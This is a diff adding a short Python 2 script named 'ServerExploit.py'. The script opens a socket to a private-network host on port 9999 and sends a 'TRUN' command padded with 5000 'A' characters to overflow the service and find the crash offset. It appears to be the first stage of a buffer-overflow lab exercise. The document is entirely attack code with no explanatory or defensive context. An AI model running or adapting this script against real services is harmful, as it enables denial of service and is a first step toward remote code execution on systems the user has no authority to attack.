@@ -1,0 +1,24 @@
+##############
+ServerExploit.py --> to cause overflow and get offset and address
+##############
+
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+host = "192.168.65.10" #target machine running app to overload
+port = 9999 #open port on machine
+
+buffer = "A"*5000 
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+print "[+] Sending exploit..."
+s.send("TRUN /.:/ " + buffer)
+print s.recv(1024)
+
+s.close()
